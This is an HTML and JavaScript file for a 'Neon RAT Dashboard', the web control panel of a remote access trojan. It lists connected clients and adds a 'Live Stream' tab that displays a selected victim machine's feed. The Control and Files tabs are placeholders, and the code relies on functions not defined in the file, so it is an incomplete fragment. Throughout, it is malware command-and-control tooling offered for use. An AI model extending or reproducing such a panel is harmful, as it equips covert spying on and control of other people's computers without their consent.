<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Neon RAT Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        /* Previous CSS remains the same */
        .stream-panel {
            background: rgba(0, 0, 0, 0.3);
            backdrop-filter: blur(10px);
            border-radius: 12px;
            padding: 20px;
            margin-top: 20px;
        }
        #stream-display {
            width: 100%;
            border-radius: 8px;
            background: #000;
        }
        .stream-controls {
            display: flex;
            gap: 10px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Sidebar (unchanged) -->
        <div class="sidebar">
            <h2>Connected Clients</h2>
            <div id="client-list"></div>
        </div>

        <!-- Main Content -->
        <div class="main">
            <h1>Neon RAT Dashboard</h1>
            <div class="tab-buttons">
                <button class="tab-btn active" onclick="openTab('control')">Control</button>
                <button class="tab-btn" onclick="openTab('files')">Files</button>
                <button class="tab-btn" onclick="openTab('stream')">Live Stream</button>
            </div>

            <!-- Control Tab (unchanged) -->
            <div id="control" class="tab-content active">
                <!-- Previous content -->
            </div>

            <!-- Files Tab (unchanged) -->
            <div id="files" class="tab-content">
                <!-- Previous content -->
            </div>

            <!-- New Stream Tab -->
            <div id="stream" class="tab-content">
                <div class="panel">
                    <h3>Live Stream</h3>
                    <img id="stream-display" src="" alt="Live Stream">
                    <div class="stream-controls">
                        <button onclick="startStream()">Start Stream</button>
                        <button onclick="stopStream()">Stop Stream</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Tab management (unchanged)
        function openTab(tabName) {
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.style.display = 'none';
            });
            document.querySelectorAll('.tab-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            document.getElementById(tabName).style.display = 'block';
            event.currentTarget.classList.add('active');
        }

        // Stream functionality
        let streamInterval;
        function startStream() {
            if (!selectedClient) return alert('Select a client first!');
            const streamDisplay = document.getElementById('stream-display');
            streamDisplay.src = `/api/stream/${selectedClient}`;
        }

        function stopStream() {
            const streamDisplay = document.getElementById('stream-display');
            streamDisplay.src = '';
        }

        // Initialize
        updateClients();
    </script>
</body>
</html>
